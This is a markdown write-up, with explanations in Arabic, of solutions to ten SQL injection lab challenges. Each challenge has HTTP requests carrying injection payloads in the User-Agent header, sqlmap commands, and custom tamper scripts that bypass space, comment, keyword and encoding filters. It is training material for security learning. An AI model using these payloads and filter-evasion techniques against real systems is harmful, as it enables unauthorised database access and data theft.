# SQL Injection Labs Solutions

## SQLi 1: Basic UNION Injection

### PoC (Proof of Concept)
```http
GET / HTTP/1.1
Host: 1.sqli.labs
User-Agent: ' UNION SELECT user(); -- -
```

### SQLMap Automation
```bash
sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner
```

### شرح التقنية
- **التقنية المستخدمة**: UNION SELECT.
- **الغرض**: دمج استعلام SQL مع استعلام آخر للحصول على معلومات مثل اسم المستخدم الحالي.
- **SQLMap**: تم استخدام `--random-agent` لتجنب الكشف عن SQLMap عن طريق استخدام وكيل عشوائي.

---

## SQLi 2: Filtered UNION and Standard Payloads

### PoC: False Blind
```http
GET / HTTP/1.1
Host: 2.sqli.labs
User-Agent: ' or 'elscustom'='elsFALSE
```

### PoC: True Blind
```http
GET / HTTP/1.1
Host: 2.sqli.labs
User-Agent: ' or 'elscustom'='elscustom';-- -
```

### SQLMap Automation
```bash
sqlmap -u 'http://2.sqli.labs/' -p user-agent --user-agent=elsagent --technique=B --banner
```

### شرح التقنية
- **التقنية المستخدمة**: Blind SQL Injection.
- **الغرض**: استغلال نقاط الضعف بدون رؤية مباشرة للنتائج.
- **SQLMap**: استخدمنا `--technique=B` لتحديد تقنية Blind Injection.

### لماذا لم نستخدم الطريقة السابقة؟
- يتم فلترة جمل UNION وحقول مثل `1='1`.

---

## SQLi 3: Spaces Filtered

### PoC
```http
GET / HTTP/1.1
Host: 3.sqli.labs
User-Agent: '/**/UNION/**/SELECT/**/@@version;#
```

### SQLMap Automation
```bash
sqlmap -u 'http://3.sqli.labs/' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' --union-char=els --banner
```

### شرح التقنية
- **التقنية المستخدمة**: استبدال المسافات بتعليقات.
- **الغرض**: تجاوز الفلترة التي تمنع استخدام المسافات.
- **SQLMap**: استخدمنا `--tamper=space2comment` لتحويل المسافات إلى تعليقات.

### لماذا لم نستخدم الطريقة السابقة؟
- يتم فلترة المسافات بشكل كامل.

---

## SQLi 4: Comments Disabled

### PoC
```http
GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: 'UNION(select('PoC String'));#
```

### خطوات يدوية
1. **الحصول على أسماء الجداول**:
   ```http
   GET / HTTP/1.1
   Host: 4.sqli.labs
   User-Agent: 'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
   ```
2. **الحصول على أسماء الأعمدة**:
   ```http
   GET / HTTP/1.1
   Host: 4.sqli.labs
   User-Agent: 'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#
   ```

### شرح التقنية
- **التقنية المستخدمة**: الاستعلامات بدون تعليقات.
- **الغرض**: التكيف مع القيود التي تمنع استخدام التعليقات.

### لماذا لم نستخدم الطريقة السابقة؟
- التعليقات معطلة، مما يمنع استخدام `--tamper=space2comment`.

---

## SQLi 5: Double Quotes for Strings

### PoC
```http
GET / HTTP/1.1
Host: 5.sqli.labs
User-Agent: "UNION(select('PoC String'));#
```

### خطوات يدوية
1. **الحصول على أسماء الجداول**:
   ```http
   GET / HTTP/1.1
   Host: 5.sqli.labs
   User-Agent: "union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
   ```

### شرح التقنية
- **التقنية المستخدمة**: استخدام علامات اقتباس مزدوجة.
- **الغرض**: التكيف مع القيود التي تتطلب علامات اقتباس مزدوجة.

### لماذا لم نستخدم الطريقة السابقة؟
- يتم رفض علامات الاقتباس الأحادية.

---

## SQLi 6: Reserved Words Filtering

### PoC
```http
GET / HTTP/1.1
Host: 6.sqli.labs
User-Agent: ' UNiOn seLect @@versiOn;#
```

### Tampering Script
```python
def tamper(payload, **kwargs):
    retVal = str()
    if payload:
        for i in xrange(len(payload)):
            if i % 2 == 0:
                retVal += payload[i].upper()
            else:
                retVal += payload[i].lower()
    return retVal
```

### SQLMap Automation
```bash
sqlmap -u 'http://6.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner
```

### شرح التقنية
- **التقنية المستخدمة**: تغيير حالة الأحرف لتجاوز الفلترة.
- **الغرض**: التكيف مع الفلترة التي تمنع الكلمات المحجوزة.

### لماذا لم نستخدم الطريقة السابقة؟
- يتم فلترة الكلمات المحجوزة بشكل صارم.

---

## SQLi 7: Case-Insensitive Filtering

### PoC
```http
GET / HTTP/1.1
Host: 7.sqli.labs
User-Agent: ' uZEROFILLnZEROFILLiZEROFILLoZEROFILLn ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL
```

### Tampering Script
```python
def tamper(payload, **kwargs):
    FILL = 'ZEROFILL'
    retVal = str()
    if payload:
        for char in payload:
            retVal += char + FILL
    return retVal
```

### SQLMap Automation
```bash
sqlmap -u 'http://7.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --banner
```

### شرح التقنية
- **التقنية المستخدمة**: إدخال سلسلة مخصصة بين الأحرف.
- **الغرض**: تجاوز الفلترة غير الحساسة لحالة الأحرف.

### لماذا لم نستخدم الطريقة السابقة؟
- الفلترة تقطع الكلمات المحجوزة بالكامل.

---

## SQLi 8: URL Encoding

### PoC
```http
GET / HTTP/1.1
Host: 8.sqli.labs
User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
```

### SQLMap Automation
```bash
sqlmap -u 'http://8.sqli.labs/' -p user-agent --tamper=charencode --technique=U --banner
```

### شرح التقنية
- **التقنية المستخدمة**: ترميز URL.
- **الغرض**: تجاوز الفلترة المباشرة للنصوص.

---

## SQLi 9: Double Encoding

### PoC
```http
GET / HTTP/1.1
Host: 9.sqli.labs
User-Agent: %25%36%31%25%36%31%25%36%31...
```

### SQLMap Automation
```bash
sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner
```

### شرح التقنية
- **التقنية المستخدمة**: ترميز مزدوج.
- **الغرض**: تجاوز القيود على الإدخال المرمّز.

---

## SQLi 10: Reserved Keywords with Functions

### PoC
```http
GET / HTTP/1.1
Host: 10.sqli.labs
User-Agent: ') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -
```

### SQLMap Automation
```bash
sqlmap -u 'http://10.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --prefix="notexistant')" --suffix="; -- " --union-char=els --banner
```

### شرح التقنية
- **التقنية المستخدمة**: مزيج من الكلمات المحجوزة والوظائف.
- **الغرض**: التكيف مع القيود المتقدمة.
```

يمكنك الآن نسخ هذا الملف إلى مستودع GitHub الخاص بك. إذا كنت بحاجة إلى تحسينات إضافية، فلا تتردد في طلب ذلك!
